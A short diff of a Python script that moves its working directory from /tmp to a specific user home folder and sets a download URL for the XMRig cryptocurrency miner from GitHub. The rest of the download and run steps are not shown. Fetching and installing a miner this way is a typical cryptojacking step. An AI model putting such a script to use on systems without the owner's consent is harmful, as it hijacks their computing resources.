@@ -2,9 +2,8 @@ import requests
 import tarfile
 import os
 
-# Specify the directory to save the file
-download_dir = "/tmp"
-os.chdir(download_dir)
+# Change directory to home directory
+os.chdir("/home/u98039cfebcf01ca979f38309093060b")
 
 # Download the file
 url = "https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz"
